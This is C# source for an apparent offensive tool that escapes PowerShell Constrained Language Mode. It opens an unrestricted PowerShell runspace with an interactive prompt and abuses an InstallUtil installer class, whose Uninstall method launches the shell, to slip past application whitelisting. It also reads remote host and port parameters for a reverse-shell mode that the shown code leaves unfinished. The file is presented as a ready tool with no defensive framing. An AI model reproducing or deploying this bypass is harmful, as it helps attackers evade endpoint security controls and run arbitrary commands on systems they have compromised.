using System;
using System.Collections.ObjectModel;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace PsBypassCostraintLanguageMode
{
    public class Program
    {
        public static void Main(string[] args)
        {
            string command = "";
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            // set execution policy to Unrestricted for current process
            // this should bypass costraint language mode from the low priv 'ConstrainedLanguage' to our beloved 'FullLanguage'
            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
            runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process");

            do
            {
                Console.Write("PS > ");
                command = Console.ReadLine();


                // vervbse check!
                if (!string.IsNullOrEmpty(command))
                {
                    using (Pipeline pipeline = runspace.CreatePipeline())
                    {
                        try
                        {

                            pipeline.Commands.AddScript(command);
                            pipeline.Commands.Add("Out-String");
                            // if revshell true - run asyn one-liner script and exit

                            // otherwise stay open and ready to accept and invoke commands
                            Collection<PSObject> results = pipeline.Invoke();
							//var process = (Process)pipeline.Output.Read().BaseObject;

							StringBuilder stringBuilder = new StringBuilder();
                            foreach (PSObject obj in results)
                            {
								stringBuilder.AppendLine(obj.ToString());
                            }
                            Console.Write(stringBuilder.ToString());
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("{0}", ex.Message);
                        }
                    }
                }
            }
            while (command != "exit");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string rhost = "", port = "";
            string revshell = this.Context.Parameters["revshell"];
            if (!string.IsNullOrEmpty(revshell))
            {
                rhost = this.Context.Parameters["rhost"];
                if (rhost == null)
                {
                    throw new InstallException("Mandatory parameter 'rhost' for revshell mode");
                }

                port = this.Context.Parameters["rport"];
                if (port == null)
                {
                    throw new InstallException("Mandatory parameter 'port' for revshell mode");
                }
            }
            string[] args = new string[] { rhost, port };
            PsBypassCostraintLanguageMode.Program.Main(args);
        }

        public override void Install(System.Collections.IDictionary savedState)
        {

        }

    }

}
